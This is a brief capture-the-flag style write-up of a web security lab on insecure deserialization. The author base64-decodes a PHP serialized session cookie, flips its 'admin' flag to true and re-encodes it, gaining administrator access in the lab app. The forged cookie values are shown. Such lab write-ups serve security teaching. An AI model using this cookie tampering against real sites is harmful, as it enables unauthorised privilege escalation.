Title: Modifying serialized objects
Desc:  This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. 
To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges.
Then, delete the user carlos. You can log in to your own account using the following credentials: wiener:peter 

I get session cookie logging in as wiener:
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d

It is base64 encoded string:
![image](https://github.com/user-attachments/assets/feedf7bb-b58f-4269-ba83-e683c0574c56)

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}7` 
I can see, that it is PHP serialized object. Let's try to edit that:
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}7` 
Encode the string to base64.

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO303

and it gives me administrator access to delete carlos.









